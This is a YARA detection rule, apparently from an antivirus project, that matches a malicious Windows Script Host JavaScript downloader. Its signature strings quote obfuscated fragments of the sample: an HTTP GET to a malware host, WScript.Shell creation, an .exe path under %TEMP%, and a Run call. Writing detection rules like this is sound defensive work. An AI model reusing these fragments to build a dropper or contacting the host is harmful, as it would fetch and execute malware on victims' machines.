rule sig_20160401_60fd419fc407f21601a37b06c7b70dfd {
  meta:
    description = "datamaliciousorder - file 20160401_60fd419fc407f21601a37b06c7b70dfd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94b3807b6987a7f4059c3a5837408f1b7d128892f5c5e679319d1ae8c0856ea6"

  strings:
    $s1  = "LyQer[KvpBxq](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "var BokLed = function TlzMz() {return WScript[MlkXbz](\"WScript\"+\".Shell\");}(), TeGar = 11;" fullword ascii
    $s3  = "function BuvKr(JiOs, QtWf){JuqPnf = JuqPnf * 1; return JiOs - QtWf;};" fullword ascii
    $s4  = "if (LyQer[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QicFtc(){return OyDf + \"\";};" fullword ascii
    $s6  = "function GvHkc() {return BokLed[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XaCO9xbxmnuPZiDV.ex\" + \"e\";};" fullword ascii
    $s7  = "function QaqIav() {return ((NvrCeb == true) && (NvrCeb == MpvFts)) ? 1 : JuqPnf;};" fullword ascii
    $s8  = "NvrCeb = true; " fullword ascii
    $s9  = "var NvrCeb = false;" fullword ascii
    $s10 = "return BuvKr(MbXym, FdeXg);" fullword ascii
    $s11 = "var MbDu = new this[\"Date\"]();" fullword ascii
    $s12 = "var MpvFts = false;" fullword ascii
    $s13 = "var LkAq = false;" fullword ascii
    $s14 = "function NiWf(){return MlkXbz;};" fullword ascii
    $s15 = "function NoItl(AfuGv){BokLed[\"R\"+\"un\"](AfuGv, JuqPnf, JuqPnf);};" fullword ascii
    $s16 = "function VaDk(IcyYu) {var SeiUgv = (1, 2, 3, 4, 5, IcyYu); return SeiUgv;};" fullword ascii
    $s17 = "function WiLsw(){return 23;};" fullword ascii
    $s18 = "MpvFts = true; " fullword ascii
    $s19 = "function LrRa()" fullword ascii
    $s20 = "} catch(BoPi){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}